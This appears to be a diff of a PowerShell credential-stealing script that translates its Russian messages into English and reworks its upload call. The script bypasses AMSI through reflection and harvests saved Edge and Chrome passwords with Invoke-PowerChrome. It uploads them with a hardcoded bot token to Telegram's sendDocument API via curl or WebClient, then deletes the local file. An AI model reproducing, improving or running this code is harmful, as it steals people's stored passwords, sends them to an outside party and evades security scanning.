@@ -927,7 +927,7 @@ if (-not ($Browser)){
 # ВЫЗОВ СКРИПТА И ОТПРАВКА В TELEGRAM
 # ============================================
 
-# 1. AMSI BYPASS (чтоб не сдохнуть)
+# 1. AMSI BYPASS
 $a = 'System.Management.Automation.A'
 $b = 'msiUtils'
 $c = [Ref].Assembly.GetType($a + $b)
@@ -935,10 +935,10 @@ $d = $c.GetField('amsiInitFailed','NonPublic,Static')
 $d.SetValue($null,$true)
 
 # 2. Сбор паролей
-Write-Host "[*] Сбор паролей Edge..." -ForegroundColor Cyan
+Write-Host "[*] Collecting Edge passwords..." -ForegroundColor Cyan
 $edgeData = Invoke-PowerChrome -Browser Edge -HideBanner
 
-Write-Host "[*] Сбор паролей Chrome..." -ForegroundColor Cyan
+Write-Host "[*] Collecting Chrome passwords..." -ForegroundColor Cyan
 $chromeData = Invoke-PowerChrome -Browser Chrome -HideBanner
 
 # 3. Сохраняем в файл
@@ -955,12 +955,13 @@ $chromeData | Out-File $outputFile -Encoding UTF8 -Append
 $token = "7272773356:AAExCRzF3rkCdSlkt8BkJDLIifDpQgMc25I"
 $chat = "6713760986"
 
-Write-Host "[*] Отправка в Telegram..." -ForegroundColor Yellow
+Write-Host "[*] Sending to Telegram..." -ForegroundColor Yellow
 
 # Пробуем curl
 try {
-    & curl.exe -s -F chat_id="$chat" -F document=@"$outputFile" "https://api.telegram.org/bot$token/sendDocument"
-    Write-Host "[+] Отправлено через curl" -ForegroundColor Green
+    $curlArgs = @('-s', '-F', "chat_id=$chat", '-F', "document=@$outputFile", "https://api.telegram.org/bot$token/sendDocument")
+    & curl.exe $curlArgs 2>$null
+    Write-Host "[+] Sent via curl" -ForegroundColor Green
 }
 catch {
     Write-Host "[-] Curl error: $_" -ForegroundColor Red
@@ -970,14 +971,14 @@ catch {
         $uri = "https://api.telegram.org/bot$token/sendDocument"
         $wc = New-Object System.Net.WebClient
         $wc.UploadFile($uri, "?chat_id=$chat", $outputFile)
-        Write-Host "[+] Отправлено через WebClient" -ForegroundColor Green
+        Write-Host "[+] Sent via WebClient" -ForegroundColor Green
     }
     catch {
-        Write-Host "[-] Все методы отправки провалились: $_" -ForegroundColor Red
+        Write-Host "[-] All send methods failed: $_" -ForegroundColor Red
     }
 }
 
 # 5. Удаляем файл
 Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
 
-Write-Host "[+]done" -ForegroundColor Green
+Write-Host "[+] Done!" -ForegroundColor Green
